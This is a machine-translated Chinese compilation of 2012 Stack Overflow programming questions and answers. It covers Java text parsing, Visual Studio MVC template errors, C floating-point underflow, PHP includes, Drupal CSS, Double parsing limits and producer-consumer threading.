如果您使用的是 ASP.NET 4.5，MachineKey.Encode() 和 MachineKey.Decode() 已被[弃用](http://blogs.msdn.com/b/webdev/archive/2012/10/23/cryptographic-improvements-in-asp-net-4-5-pt-2.aspx)，取而代之的是[DataProtector](http://msdn.microsoft.com/en-us/library/system.security.cryptography.dataprotector)

# java - Java Regix 尝试从文本文件中读取子字符串

> ID：13537738
> 
> 赞同：1
> 
> 时间：2012-11-24T02:33:33.477
> 
> 标签：java, text

我正在尝试从充满垃圾的文本中读取某些有用的信息，但它是一些传感器读数。我从这段代码中丢失了很多有用的信息

像'NH3 水平 l 是：9.9977'

必须有比这更有效的东西有人可以帮我吗

```
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;
public class sensorclean {
final static String Array[] = new String[1000];
    static int g = 0;

public static void main(String[] args) {

File file = new File("C:/Users/Omar/Desktop/datatest.txt");
try {
Scanner scanner = new Scanner(file);
while (scanner.hasNextLine()) {
String line = scanner.nextLine();
String newline=ignoreComments(line);
if(newline!=null)
    Array[g] = newline;
    g++;
}

for(int i =0; i<Array.length;i++){
    if(Array[i]!=null)

    {

        Array[i] = Array[i].trim();

    System.out.println(Array[i]);

    }
}

}

 catch (FileNotFoundException e) 
{
e.printStackTrace();
}
}
private static String ignoreComments(String line) {
String result_line=null;

int upto=line.indexOf('#');
int upto1 = line.indexOf('ë');
int upto2 = line.indexOf('~');
int upto3 = line.indexOf('€');
int upto4 = line.indexOf('?');
if((upto!=0&&upto>0)&&(upto1!=0&&upto1>0)){
result_line=line.substring(1, upto4);
System.out.println("here");
}
else{
if(upto<0 && upto1<0 && upto2<0 && upto3<0 ){
result_line=line;
}/*else{
result_line="";
}*/
}
return result_line;

}
} 
```

我的传感器读取温度并将其存储在 .txt 文件中。但它在其中添加了垃圾我正在开发一个从中提取有用信息的java

这是文件中的示例

> *ë~^€}3¢@iw4R#}3¢@iw CO 水平为：101.0831，CO2 水平为：375.2046，NH3 水平为：9.9977 ?~O€}3¢@isGR# -mac:0013A20040691673,-time ：星期三，12/11/14 - 14:06.56，E~G€}3¢@isGR#}3¢@is TEMP: 51.9354, HUMIDITY is: 9.6129, bat: 63%*
> 
> *~_€}3¢@isGR#}3¢@is CO 水平为：106.1330，CO2 水平为：374.7616，NH3 水平为：86.7625 ?~O€}3¢@if:R# -mac:0013A20040691666,-时间：星期三，12/11/14 - 14:09.20，é~I€}3¢@if:R#}3¢@if TEMP: 280.0000, HUMIDITY is: 17.7677, bat: 96% I~^€}3 ¢@if:R#}3¢@如果 CO 水平为：128.8912，CO2 水平为：375.6922，NH3 水平为：9.9977 E~O€}3¢@iw2R# -mac:0013A20040691677，-时间：星期三，12 /11/14 - 14:12.11, ?~H€}3¢@iw4R#}3¢@iw TEMP: 20.3225, HUMIDITY is: 19.3161, bat: 87 % ?~^€}3¢@iw1R#}3¢ @iw CO 浓度为：101.0831，CO2 浓度为：375.1160，NH3 浓度为：9.9977？*

这种垃圾并不总是相同的，它的变化

这是我当前的代码

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T06:22:21.027

它不是基于正则表达式的，仍然：

```
public static void main(String[] args) throws Exception {
    StringBuilder tmp = new StringBuilder();
    StringBuilder res = new StringBuilder();
    Scanner sc = new Scanner(new File("test.txt"));
    while (sc.hasNextLine()) {
        String line = sc.nextLine();
        boolean isRubbish = false;
        for (char c : line.toCharArray()) {
            if (c == ' ') {
                if (!isRubbish) {
                    res.append(tmp).append(' ');
                } else {
                    isRubbish = false;
                }
                tmp.setLength(0);
            } else if (isRubbish(c)) {
                isRubbish = true;
            } else {
                tmp.append(c);
            }
        }
    }
    System.out.println(res);
}

private static boolean isRubbish(char c) {
    return "#^}@?".indexOf(c) > -1;
} 
```

# c# - 在 VS2012 中创建新的 ASP.NET MVC 4 Web 应用程序时出现 0x80070002 错误

> ID：13537742
> 
> 赞同：9
> 
> 时间：2012-11-24T02:33:54.363
> 
> 标签：c#, asp.net-mvc-4, visual-studio-2012

I'm trying to create a new ASP.NET MVC 4 Web Application, when this message pops up after selecting a project template (eg Empty) and pressing OK:

![错误信息](../Images/9f01beb38e8b7cfe092e8d23e0baa9a7.png)

我正在使用 Visual Studio 2012 Professional 运行 Windows 8 Professional。

到目前为止，我已经尝试了一些小事情：

*   以管理员身份运行 VS2012
*   `devenv /setup`从开发人员命令提示符运行
*   从[http://www.asp.net/downloads](http://www.asp.net/downloads)重新安装*Microsoft ASP.NET MVC 4*
*   从 VS2012 安装程序运行*修复*
*   从头开始安装 Visual Studio 2012 Professional

上述步骤都没有帮助，所以某处可能出现了问题。

有没有人经历过类似的事情？任何想法将不胜感激。

如果您需要，请随时询问更多信息、日志或其他内容：)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T22:15:33.803

这会奏效，但这不是最安全的做法。

MVC 向导是 VS 中的一个共享组件，即。Common7\IDE 中有一份 DLL 副本。

当您安装 2012.2 更新，然后完全安装另一个 SKU 时，您将拥有来自新 SKU 的旧模板和新向导。在这种情况下你应该做的是：

1.  安装 Express 2012
2.  安装 Web Tools 2012.2 更新（这会删除 4.1 模板）
3.  安装 VS Pro 2012（MVC 模板不起作用）
4.  要解决此问题，您需要转到添加/删除程序并修复“Microsoft ASP.NET Web Frameworks and Tools 2012.2”。修复操作将找出您缺少 VSPro SKU 的更新 MSI 并为您安装它。

雅克

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T20:47:18.740

来自 Jacques（编写安装程序）：

听起来项目模板缓存中缺少文件。

如果他已经安装了所有东西，那么他可以尝试以下

1.  关闭所有VS实例
2.  从 Program Files\Microsoft Visual Studio 11.0\Common7\IDE\ProjectTemplatesCache 中删除 ProjectTemplatesCacheFolder
3.  以管理员身份启动 VS 开发人员命令提示符
4.  运行 devenv /setup
5.  确认 ProjectTemplateCache 已重建

如果缓存没有重建，那么系统上就会出现更严重的错误。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T22:25:32.643

这发生在我在一台装有 VS 2012 Express 的机器上安装 VS 2012 Pro 之后（反之亦然）。问题是他们使用了不同版本的 MVC 4 模板。一个正在使用：

*   BasicMvcWebApplicationProjectTemplatev4.0.csaspx
*   BasicMvcWebApplicationProjectTemplatev4.0.cshtml
*   EmptyMvcWebApplicationProjectTemplatev4.0.csaspx
*   EmptyMvcWebApplicationProjectTemplatev4.0.cshtml
*   MvcWebApplicationProjectTemplatev4.0.csaspx
*   MvcWebApplicationProjectTemplatev4.0.cshtml
*   ...

另一个：

*   BasicMvcWebApplicationProjectTemplatev4.1.csaspx
*   BasicMvcWebApplicationProjectTemplatev4.1.cshtml
*   EmptyMvcWebApplicationProjectTemplatev4.1.csaspx
*   EmptyMvcWebApplicationProjectTemplatev4.1.cshtml
*   MvcWebApplicationProjectTemplatev4.1.csaspx
*   MvcWebApplicationProjectTemplatev4.1.cshtml
*   ...

你可以在这里查看：

**VS 2012 专业版**

C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\ProjectTemplates\CSharp\Web\1033

**VS 2012 快递**

C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\VWDExpress\ProjectTemplates\CSharp\Web\1033

我最终重新格式化了我的机器（在意识到他们使用不同的版本之前），但是这次我先安装了 VS 2012 PRO，然后安装了 VS 2012 Express，但我遇到了同样的问题。所以我将 *ProjectTemplatev4.1.cshtml 文件复制到

C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\VWDExpress\ProjectTemplates\CSharp\Web\1033

它解决了这个问题。

# c - 浮点数精度

> ID：13537751
> 
> 赞同：0
> 
> 时间：2012-11-24T02:36:59.703
> 
> 标签：c, floating-point, precision, exp

> **可能重复：**
> [浮点精度](https://stackoverflow.com/questions/872544/precision-of-floating-point)

我正在尝试使用一些浮点数来计算概率，但我的最终结果总是为零。请找到以下代码和示例。

```
sd_attr4_ok = 3022.115234
unknwn_attr4 = 111
mean_attr4_ok = 32824.566406
var_attr4_ok = 9133180.000000

    (1/(sqrt(2*3.14)*sd_attr4_ok))*(1/pow(2.71828,((pow((atoi(unknwn_attr4)-mean_attr4_ok),2))/(2*var_attr4_ok)))) 
```

请帮助我解决这个问题。

如果我运行下面的程序，我仍然得到 0.000000：

```
#include <stdio.h>
#include <math.h>

int main()
{
        float a=(1/(sqrt(2*3.14)*3022.115234))*(1/pow(2.71828,(pow((111-32824.5666406),2))/(2*9133180)));
        printf("The probability is - %f\n",a);
        return 0;
} 
```

同样，如果我运行下面的程序，我仍然会得到 0.000000。

```
#include <stdio.h>
#include <math.h>

int main()
{
        float a=(1/(sqrt(2*3.14)*3022.115234));
        float b=pow((111-32824.5666406),2)/(2*9133180);
        float c=pow(2.71828,b);
        float d=1/c;
        printf("The probability is %f-%f-%f-%f\n",a,b,c,d);
        return 0;
} 
```

我的结果集：

```
***OK*** 0.908396-0.000084-0.000168-0.000000-0.000000
***FRAUD*** 0.091604-0.000835-0.000835-0.000000-0.000000
***OK FRAUD*** 0.000000 0.000000 
```

如果您看到上面的结果，则第 4 和第 5 个属性结果是通过上述程序得出的。第三行表示来自 OK 和 FRAUD 的所有 5 个值的乘积。但我的最终结果为零，无法比较这些值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T02:48:23.187

你的任期

```
pow(2.71828, ((pow...))) 
```

得出一个巨大的数字（27806155998094886059376640.000000）。该数字的倒数太小，无法显示 %f（使用 %e 为 3.596326e-26）。

尝试分离出你的大表达式的术语并检查它们的值。

编辑：

> 谢谢`%e`。但我现在需要比较两个`%e`值以获得我想要的结果。您能否建议我使用哪种数据类型来解决此问题？

不，您需要比较两个`double`或`float`值。%e 只是打印格式...

抱歉，如果这太基本了，但是要比较数字，请使用类似

```
float a = ...;
float b = ...;
if (a > b) {
    printf("%e\n", a);
} else {
    printf("%e\n", b);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T02:40:18.663

您在看起来像 int 的东西上使用`atoi()`（其中包含 a ）。`const char *`你甚至没有收到警告吗？你想做什么`atoi()`？

# php - php外部函数调用不起作用

> ID：13537755
> 
> 赞同：0
> 
> 时间：2012-11-24T02:38:34.783
> 
> 标签：php, wordpress, function, external

我不确定这个问题是否需要一些代码示例，但是......

情况如下：

我正在一个其他人已经完成工作的网站上工作。我正在尝试调用位于文件中的外部函数，让我们说“myFunctions.php”。前一个人在主网页中对该文件进行了函数调用，没有问题。我创建了一个新的短函数并将其放在同一个文件中。网页已经有一个 'require_once("myfunctions.php");' 线。该网站在 Wordpress 中，虽然是一个高度定制的网站。新功能放在页面中时可以正常工作，但是我想在多个页面上使用它。

如何让新功能发挥作用？它与Wordpress有关吗？

这对我来说似乎很奇怪，因为文件中已经存在的其他功能没有问题。

谢谢你。

* * *

下一个测试：

似乎问题出在通话中。

我简化了代码以进行测试。这是我现在拥有的代码：

```
<?php
$user = getUserInfo($username);
$myTest = strTest();

echo $myTest;
?> 
```

在外部函数文件funct.php中：

```
<?php

function strTest(){
   return "This test worked!";
}

?> 
```

上面的函数“getUserInfo”是一个较旧的函数，它也驻留在funct.php 中并且工作得很好。

但是，新函数“strTest”在调用时不起作用，并且从该行开始页面为空白。

* * *

更新！

找到了！

对所有做出贡献的人表示抱歉，但看起来这只是一个愚蠢的疏忽。我刚刚意识到另一个人的功能包含另一个文件夹中的文件。我正在使用的文件夹中有它的副本，但实际的“包含”语句引用了另一个文件夹。

与我之前遇到的许多问题一样，当结果看起来很奇怪时，问题通常是语法或地址错误。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:20:22.203

将其移动到`functions.php`样式表目录中。所有 WP 脚本都可以调用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T05:33:13.013

大多数 WP 项目至少有一个*头文件*；如果您从这些头文件中的任何一个中调用函数文件，那么继承该头文件的所有页面都可以使用该函数文件。

希望这可以帮助。如果您需要更多详细信息，请告诉我。

# c# - Android 在显示消息框之前等待

> ID：13537756
> 
> 赞同：0
> 
> 时间：2012-11-24T02:38:44.930
> 
> 标签：c#, monodevelop, sleep, wait, toast

我正在为 Android 使用 MonoDevelop，并且有一个关于在显示 Toast 然后显示 Messagebox 后等待 x 时间的问题。

做这个的最好方式是什么？

我尝试了以下方法，但没有成功：

```
System.Threading.Thread.Sleep(5000) 
```

使用上面的代码，消息框会直接显示在吐司之后吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T07:33:07.277

好吧，如果你试图做一些类似延迟的事情，我对机器人了解不多，但我认为你可以做这样的事情，它会在这样做的同时继续其他事件。

```
public void delay(int milliseconds)
{
    DateTime dt = DateTime.Now + new TimeSpan(0, 0, 0, 0, millseconds);
    while(dt > DateTime.Now)
    {
        Application.DoEvents();
    }
}

public ConstructorNameHere
{
    // Show Toast would go here.
    delay(1000); // Waits for 1 second
    MessageBox.Show("Hello World!");
} 
```

我希望这有帮助。告诉我是不是。

# java - 从一个值大于 Double.MaxValue 的字符串中解析一个 double

> ID：13537757
> 
> 赞同：5
> 
> 时间：2012-11-24T02:38:57.287
> 
> 标签：java, parsing, double, ieee-754

考虑以下java代码：

```
String toParse = "1.7976931348623157E308"; //max value of a double in java        
double parsed = Double.parseDouble(toParse);
System.out.println(parsed); 
```

因为提到的`1.7976931348623157E308`一切都是有意义的，并且得到了正确的输出。

现在，如果尝试解析`1.7976931348623158E308`（递增前的最后一位`E`），您仍然会在控制台中打印出最大值！
只有在尝试解析`1.7976931348623159E308`（最后一位数字再次增加）并且更大的一位得到`Infinity`.
相应的负值的行为相同。

为什么`... 8E308`解析为`... 7E308`而不是`Infinity`？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-24T03:08:35.203

parseDouble 文档的 SE 7 版本是指 valueOf 文档，它说：

> 请注意，四舍五入规则也意味着溢出和下溢行为；如果 s 的确切值在幅度上足够大（大于或等于 (MAX_VALUE + ulp(MAX_VALUE)/2），则四舍五入将导致无穷大，并且如果 s 的确切值在幅度上足够小（小于大于或等于 MIN_VALUE/2)，四舍五入到浮点数将导致零。

这与根据 IEEE 754 浮点运算的通常舍入到最近规则的说法一致。

您必须想象通过首先计算忽略指数限制的最接近的浮点数，然后检查指数是否适合来完成转换。Double.MAX_VALUE 是该规则下与某些严格大于它的数字最接近的数字。

要确认这是正常的舍入行为，请考虑以下程序：

```
 public class Test {
      public static void main(String[] args) {
        double ulp = Math.ulp(Double.MAX_VALUE);
        System.out.println(ulp);
        System.out.println(Double.MAX_VALUE);
        System.out.println(Double.MAX_VALUE+ulp/2.0000000001);
        System.out.println(Double.MAX_VALUE+ulp/2);
      }
    } 
```

它输出：

```
1.9958403095347198E292
1.7976931348623157E308
1.7976931348623157E308
Infinity 
```

向 Double.MAX_VALUE 添加甚至略小于半个 ulp 的内容也不会改变它。添加半个 ulp 会溢出到无穷大。

# php - 如何使用数据库创建带有下拉菜单的导航菜单？

> ID：13537758
> 
> 赞同：1
> 
> 时间：2012-11-24T02:39:00.727
> 
> 标签：php, javascript, database, drop-down-menu, navigation

如果我要从数据库中为导航栏获取导航项，例如 ff: Select * FROM table WHERE linkcatagory = 'main-menu'; << 这将列出所有主菜单项，如果其中一项具有也必须从数据库中获取的子项怎么办。我还为我的子菜单声明了一个链接类别。所以逻辑是当我悬停在主要项目上时，也会从数据库中获取子菜单。我怎样才能让它工作？

下面的代码是我的示例标记，但我认为它不正确。

```
<?php include "includes/config.php";
$sql = "Select * FROM sites WHERE site_category = 'main-menu'";
$result = mysql_query($sql);
?>
<header>
<a href="index.php" class="logo"><h1>Website</h1></a><!--LOGO-->
<div id="gutter"></div><!--gutter-->
    <nav>
     <ul id="menu">
        <?php while($record = mysql_fetch_array($result)){

        $sitename = $record['site_name'];
        $sitelink = $record['site_link'];

        if($sitename == 'products'){
        ?>
        <li><a href="<?= $sitelink ?>" onMouseOver=""><?= $sitename ?></a>

            <ul class="submenu">
                <?php 
                    $sql = "Select * FROM sites WHERE 
                                             site_category = 'sub-menu'";
                    $result = mysql_query($sql);

                    while($record = 
                                            mysql_fetch_array($result)){
                ?>
                    <li><a href="<?= $sitelink ?>"><?= 
                                            $sitename ?></a></li>

                    <?php
                    }//while close 
                    ?>
            </ul>
        </li>
    <?php
    }else{
        echo "<li><a href=".$record['site_link'].">".$record['site_name']."
                         </a></li>";
    }
      }//while close?>
     </ul><!--menu-->
    </nav><!--NAV-->
</header><!--HEADER--> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:02:13.083

正如我评论的那样，我无法为您提供我使用的功能，但是对于您的 - 可能重复的 - 问题有很多答案；

[PHP/MySQL 导航菜单](https://stackoverflow.com/questions/5628722/php-mysql-navigation-menu)

[带有 php 和 MySQLi 的递归菜单](https://stackoverflow.com/questions/12432230/recursive-menu-with-php-and-mysqli)

[显示所选父级的树形菜单](https://stackoverflow.com/questions/9537502/display-tree-menu-of-selected-parent)

[使用 PHP/MySQL 的分层递归菜单](https://stackoverflow.com/questions/607052/hierarchical-recursion-menu-with-php-mysql)

# css - drupal 7 chrome不加载css规则

> ID：13537760
> 
> 赞同：0
> 
> 时间：2012-11-24T02:39:27.117
> 
> 标签：css, google-chrome, drupal-7

编辑包含所有自定义 css 的 css 文件后，站点停止在 chrome 中正确显示。IE 看起来不错...可能是我的 devtools 中的某些东西改变了它在 chrome 中的加载方式吗？

或者文件本身是否有错误：

```
@import url("http://florabellemv.com/sites/all/themes/stark/layout.css?mdyj3p"); 
```

头-：

```
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" version="XHTML+RDFa 1.0" dir="ltr">

<head profile="http://www.w3.org/1999/xhtml/vocab">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="http://florabellemv.com/sites/all/themes/stark/favicon.ico" type="image/vnd.microsoft.icon" />
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
<link rel="alternate" type="application/rss+xml" title="Florabelle Martha&#039;s Vineyard RSS" href="http://florabellemv.com/rss.xml" />
  <title>Florabelle Martha&#039;s Vineyard | perfume, bath &amp; body, and more...</title>
  <style type="text/css" media="all">@import url("http://florabellemv.com/modules/system/system.base.css?mdyj3p");
@import url("http://florabellemv.com/modules/system/system.menus.css?mdyj3p");
@import url("http://florabellemv.com/modules/system/system.messages.css?mdyj3p");
@import url("http://florabellemv.com/modules/system/system.theme.css?mdyj3p");</style>
<style type="text/css" media="all">@import url("http://florabellemv.com/modules/field/theme/field.css?mdyj3p");
@import url("http://florabellemv.com/modules/node/node.css?mdyj3p");
@import url("http://florabellemv.com/sites/all/modules/ubercart/uc_attribute/uc_attribute.css?mdyj3p");
@import url("http://florabellemv.com/sites/all/modules/ubercart/uc_order/uc_order.css?mdyj3p");
@import url("http://florabellemv.com/sites/all/modules/ubercart/uc_product/uc_product.css?mdyj3p");
@import url("http://florabellemv.com/sites/all/modules/ubercart/uc_store/uc_store.css?mdyj3p");
@import url("http://florabellemv.com/modules/user/user.css?mdyj3p");
@import url("http://florabellemv.com/sites/all/modules/views/css/views.css?mdyj3p");</style>
<style type="text/css" media="all">@import url("http://florabellemv.com/sites/all/modules/colorbox/styles/default/colorbox_default_style.css?mdyj3p");
@import url("http://florabellemv.com/sites/all/modules/ctools/css/ctools.css?mdyj3p");</style>
<style type="text/css" media="all">@import url("http://florabellemv.com/sites/all/themes/stark/layout.css?mdyj3p");</style>
<style type="text/css" media="all">@import url("http://florabellemv.com/sites/default/files/fontyourface/fontsquirrel/CAC-Champagne-fontfacekit/stylesheet.css?mdyj3p");</style>
<link type="text/css" rel="stylesheet" href="http://fonts.googleapis.com/css?family=Bilbo:regular|Dancing+Script:regular|Dawning+of+a+New+Day:regular|Great+Vibes:regular|Italianno:regular|Josefin+Slab:300italic|Lovers+Quarrel:regular|Niconne:regular|Parisienne:regular|Petit+Formal+Script:regular|Poiret+One:regular|Qwigley:regular|Spirax:regular|Tangerine:700|Zeyada:regular&amp;subset=latin-ext,latin,cyrillic" media="all" />
  <script type="text/javascript" src="http://florabellemv.com/misc/jquery.js?v=1.4.4"></script>
<script type="text/javascript" src="http://florabellemv.com/misc/jquery.once.js?v=1.2"></script>
<script type="text/javascript" src="http://florabellemv.com/misc/drupal.js?mdyj3p"></script>
<script type="text/javascript" src="http://florabellemv.com/sites/all/libraries/colorbox/colorbox/jquery.colorbox-min.js?mdyj3p"></script>
<script type="text/javascript" src="http://florabellemv.com/sites/all/modules/colorbox/js/colorbox.js?mdyj3p"></script>
<script type="text/javascript" src="http://florabellemv.com/sites/all/modules/colorbox/styles/default/colorbox_default_style.js?mdyj3p"></script>
<script type="text/javascript" src="//use.edgefonts.net/alex-brush:n4;allura:n4.js"></script>
<script type="text/javascript">
<!--//--><![CDATA[//><!--
jQuery.extend(Drupal.settings, {"basePath":"\u002F", "pathPrefix":"", "ajaxPageState":{"theme":"stark", "theme_token":"9zudAyr6gjtq_GMpTSgK8zXymLTi3LsBuS9rwwU9fXw", "css":{"modules\u002Fsystem\u002Fsystem.base.css":1, "modules\u002Fsystem\u002Fsystem.menus.css":1, "modules\u002Fsystem\u002Fsystem.messages.css":1, "modules\u002Fsystem\u002Fsystem.theme.css":1, "modules\u002Ffield\u002Ftheme\u002Ffield.css":1, "modules\u002Fnode\u002Fnode.css":1, "sites\u002Fall\u002Fmodules\u002Fubercart\u002Fuc_attribute\u002Fuc_attribute.css":1, "sites\u002Fall\u002Fmodules\u002Fubercart\u002Fuc_order\u002Fuc_order.css":1, "sites\u002Fall\u002Fmodules\u002Fubercart\u002Fuc_product\u002Fuc_product.css":1, "sites\u002Fall\u002Fmodules\u002Fubercart\u002Fuc_store\u002Fuc_store.css":1, "modules\u002Fuser\u002Fuser.css":1, "sites\u002Fall\u002Fmodules\u002Fviews\u002Fcss\u002Fviews.css":1, "sites\u002Fall\u002Fmodules\u002Fcolorbox\u002Fstyles\u002Fdefault\u002Fcolorbox_default_style.css":1, "sites\u002Fall\u002Fmodules\u002Fctools\u002Fcss\u002Fctools.css":1, "sites\u002Fall\u002Fthemes\u002Fstark\u002Flayout.css":1, "sites\u002Fdefault\u002Ffiles\u002Ffontyourface\u002Ffontsquirrel\u002FCAC-Champagne-fontfacekit\u002Fstylesheet.css":1, "http:\u002F\u002Ffonts.googleapis.com\u002Fcss?family=Bilbo:regular|Dancing+Script:regular|Dawning+of+a+New+Day:regular|Great+Vibes:regular|Italianno:regular|Josefin+Slab:300italic|Lovers+Quarrel:regular|Niconne:regular|Parisienne:regular|Petit+Formal+Script:regular|Poiret+One:regular|Qwigley:regular|Spirax:regular|Tangerine:700|Zeyada:regular\u0026subset=latin-ext,latin,cyrillic":1}, "js":{"misc\u002Fjquery.js":1, "misc\u002Fjquery.once.js":1, "misc\u002Fdrupal.js":1, "sites\u002Fall\u002Flibraries\u002Fcolorbox\u002Fcolorbox\u002Fjquery.colorbox-min.js":1, "sites\u002Fall\u002Fmodules\u002Fcolorbox\u002Fjs\u002Fcolorbox.js":1, "sites\u002Fall\u002Fmodules\u002Fcolorbox\u002Fstyles\u002Fdefault\u002Fcolorbox_default_style.js":1, "\u002F\u002Fuse.edgefonts.net\u002Falex-brush:n4;allura:n4.js":1}}, "colorbox":{"transition":"elastic", "speed":"350", "opacity":"0.85", "slideshow":false, "slideshowAuto":true, "slideshowSpeed":"2500", "slideshowStart":"start slideshow", "slideshowStop":"stop slideshow", "current":"{current} of {total}", "previous":"« Prev", "next":"Next »", "close":"Close", "overlayClose":true, "maxWidth":"100%", "maxHeight":"100%", "initialWidth":"300", "initialHeight":"100", "fixed":true, "scrolling":true}});
//--><!]]>
</script>

    <script type="text/javascript" src="/sites/all/themes/stark/selectbox/jquery.selectBox.min.js"></script>
    <link type="text/css" rel="stylesheet" href="/sites/all/themes/stark/selectbox/jquery.selectBox.css"/>

</head> 
```

这是 ie 现在的样子：

[https://docs.google.com/open?id=0B2eT0kwnwUQ4VXlsQ0M5TUlvRFE](https://docs.google.com/open?id=0B2eT0kwnwUQ4VXlsQ0M5TUlvRFE)

[我的网站](http://www.florabellemv.com)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T13:05:21.373

您的 CSS 中有错误。您正在定义一些属性，但没有给它们一个值，例如`color:;`. 此外，`position`拼写错误为`positon`. 有关详细信息，请参阅[验证器结果](http://jigsaw.w3.org/css-validator/validator?uri=http://www.florabellemv.com/sites/all/themes/stark/layout.css?mdyj3p&profile=css3&usermedium=all&warning=1&vextwarning=&lang=en)。

我猜 IE 不像 Chrome 那样对无效 CSS 挑剔。尝试修复错误，看看是否能解决问题。

# java - 线程和并发

> ID：13537762
> 
> 赞同：0
> 
> 时间：2012-11-24T02:39:51.227
> 
> 标签：java, multithreading, thread-safety

有谁知道是否有一种可靠的方法来设置生产者消费者类型队列，其中包含以下内容：

1) Producer 最初将三个对象放入队列

2）消费者消费一个项目，在队列中留下两个对象

3) 控制权传回 Producer，Producer 再放一个项目 - （现在 3 个对象再次出现在队列中）

4) 消费者又消费了一件商品，因此循环继续

请注意，我需要手动设置解决方案，而不使用任何界面来完成我正在处理的任务。任何意见，将不胜感激。

线程可以进行这种微调吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T05:23:50.753

我可能会做的是有一个相对普通的队列并且还有一个信号量。将信号量初始化为 -2。让生产者在将请求排入队列时增加信号量。让消费者在出队请求之前减少信号量。在计数变为 1 之前，消费者将无法进行递减，因此队列中总会有 2 个未服务的请求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-12T13:31:46.540

```
I hope this solution gives you some help: 
```

解释如下：

两个单独的线程`(Producer thread and Consumer thread)`在一个公共队列上相互协调工作（这里我提到了数组）。生产者从一个数据数组中放入三个元素，消费者获取一个并从同一个数组中删除。当数据数组所有元素都放入队列时，消费者只一个一个地获取。`put()`并且`take()`是在单独的类中定义的同步方法`Drop`。

```
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class ProducerConsumerExample {
    public static final Lock fileLock = new ReentrantLock();
    public static final Condition condition = fileLock.newCondition();
    public static String importantInfo[] = {
            "Mares eat oats",
            "Does eat oats",
            "Little lambs eat ivy",
            "A kid will eat ivy too",
            "abc",
            "def",
            "ghi",
            "jkl",
            "mno",
            "pqr"
    };
    public static List<String> list = new ArrayList<String>();
    public static boolean done = false;
    public static void main(String[] args) {
        Drop drop = new Drop();
        Thread tProducer = new Thread(new Producer(drop));
        Thread tConsumer = new Thread(new Consumer(drop));
        try{
        tProducer.start();
        tConsumer.start();
        }
        catch(Exception ie){}
    }
}

public class Consumer implements Runnable {
    private Drop drop;

    public Consumer(Drop drop) {
        this.drop = drop;
    }

    public void run() {
        try{
            ProducerConsumerExample.fileLock.lock();
            for (String message = drop.take();
                    ! message.equals("DONE");
                    message = drop.take()) {
                System.out.format("MESSAGE RECEIVED: %s%n", message);
                ProducerConsumerExample.list.remove(0);
                if(ProducerConsumerExample.done)
                    continue;
                else{
                    ProducerConsumerExample.condition.signal();
                    System.out.println("Consumer is waiting");
                    ProducerConsumerExample.condition.await();
                }
             } catch (InterruptedException e) {}
            }
        }
        catch(Exception e){

        }
        finally{
            ProducerConsumerExample.fileLock.unlock();
        }
    }
}
import java.util.Random;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class Producer implements Runnable {
    private Drop drop;
    public Producer(Drop drop) {
        this.drop = drop;
    }

    public void run() {
        try{
            ProducerConsumerExample.fileLock.lock();
            Random random = new Random();int check = 3;

            for (int i = 0;
                    i <ProducerConsumerExample.importantInfo.length;
                    i++) {
                if(i<check){
                System.out.println("Putting message");
                System.out.println(ProducerConsumerExample.importantInfo[i]);
                drop.put(ProducerConsumerExample.importantInfo[i]);
                }
                else{
                    check = check+3;
                    i--;
                    ProducerConsumerExample.condition.signal();
                    System.out.println("Producer is waiting");
                    ProducerConsumerExample.condition.await();
                }
            }
            drop.put("DONE");
            ProducerConsumerExample.done =true;
            ProducerConsumerExample.condition.signal();
            System.out.println("Producer is waiting");
            ProducerConsumerExample.condition.await();
        }
        catch(Exception e){
            e.printStackTrace();
        }
        finally{
            ProducerConsumerExample.fileLock.unlock();
        }
    }
}
import java.util.ArrayList;
import java.util.List;

public class Drop {
    // Message sent from producer
    // to consumer.
    private String message;
    public synchronized String take() {
        System.out.println(ProducerConsumerExample.list.size());
        return ProducerConsumerExample.list.get(0);
    }

    public synchronized void put(String message) {
        // Store message.
        ProducerConsumerExample.list.add(message);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T03:14:49.837

Java 7 有一个[LinkedTransferQueue](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/LinkedTransferQueue.html)听起来像您正在寻找的东西，或者查看父类型[BlockingQueue](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/BlockingQueue.html)，我相信其中一个会符合要求。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-24T03:20:29.163

     您可以使用 ArrayList 并将容量设置为 3；然后，只要 Producer 执行，就会检查数组大小；如果大小小于 3，只需将值插入 ArrayList 直到大小为 3；如果大小为 3；只需调用*notifyAll()*方法即可完成。
      同样对于Consumer，如果大小为3，则消费其中一个值，并将其从ArrayList中移除；如果大小小于 3，只需调用*notifyAll()*方法即可完成。
     简而言之，这基本上就是它的工作原理；实施将取决于您计划用它实现的目标。

     希望这可以帮助。

# c - 死后慢慢变黑

> ID：13537766
> 
> 赞同：4
> 
> 时间：2012-11-24T02:40:25.150
> 
> 标签：c, opengl, fade

